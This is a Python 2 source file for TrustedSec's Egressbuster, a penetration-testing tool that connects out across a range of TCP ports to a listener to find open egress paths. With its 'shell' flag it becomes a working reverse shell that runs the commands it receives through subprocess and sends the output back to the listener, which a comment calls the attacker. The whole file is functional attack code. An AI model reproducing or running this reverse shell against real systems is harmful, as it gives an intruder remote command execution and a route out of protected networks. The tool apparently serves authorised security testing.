#!/usr/bin/python
#
# TrustedSec Egressbuster Reverse Shell
#
# Written by Dave Kennedy (ReL1K)
#
# This is the actual egressbuster that will connect out from a network to the listener then spawn a shell
#
# Visit: https://www.trustedsec.com - Click on the downloads section for more.
#
from socket import *
import sys
import time
import thread
import subprocess
import os

# try to import
try:
        ipaddr = sys.argv[1]
        portrange = sys.argv[2]
        portrange = portrange.split("-")
        lowport = int(portrange[0])
        highport = int(portrange[1])        

except IndexError:
        print """

        TrustedSec, LLC
   https://www.trustedsec.com

Quick egress buster reverse shell
Written by: Dave Kennedy (ReL1K) (@HackingDave)
A TrustedSec Project

NOTE: Supports all 65536 ports.

Usage:

Note that the last option is optional. If you want a shell to spawn when a port
is detected, simply type shell as an optional flag.

egressbuster.exe <listener_ip_address> <lowport-highport> <optional_flag_shell>

example: egressbuster.exe 10.9.5.2 1-65536 shell
        """
        sys.exit()

shell = ""
try: shell = sys.argv[3]
except: pass

# cycle through ranges
base_port = int(lowport)-1
end_port = int(highport)

print "Sending packets to egress listener..."

def start_socket(ipaddr,base_port, shell):

        # try block to catch exceptions        
        try:
                sockobj = socket(AF_INET, SOCK_STREAM)
                sockobj.connect((ipaddr, base_port))
                sockobj.send(str(base_port))
		sockobj.send('[*] Connection Established!')
		if shell == "shell":
			# start loop
			while 1:
	                        # recieve shell command
	  			data = sockobj.recv(1024)
	   			# if its quit, then break out and close socket
	                        if data == "quit": break	
	     			# do shell command
				if data.startswith("cd "):
					data = data.replace("cd ", "")
					cwd = os.getcwd()
					if os.path.isdir(cwd + data):
						if data != "/":
							data = cwd + data

					if os.path.isdir(data):
						print data
						os.chdir(data)
						stdout_value = "Changed directory."
 
					else:
						stdout_value ="Invalid directory. Be sure to use full pathnames to change directories. Not individual directories."

				else:
		    			proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		    			# read output
		    			stdout_value = proc.stdout.read() + proc.stderr.read()
		    			# send output to attacker

	     			sockobj.send(stdout_value)
			# close socket
			sockobj.close()
			sys.exit()
        		    
        # if we throw an error
	finally: print "test"
#        except Exception,e :
#		print e
                # pass through, ports closed
#                pass

while 1:
        base_port = base_port + 1
        thread.start_new_thread(start_socket, (ipaddr,base_port, shell))
        time.sleep(0.01)
        if base_port == end_port:
                break

print "All packets have been sent"
while 1:
        time.sleep(50)


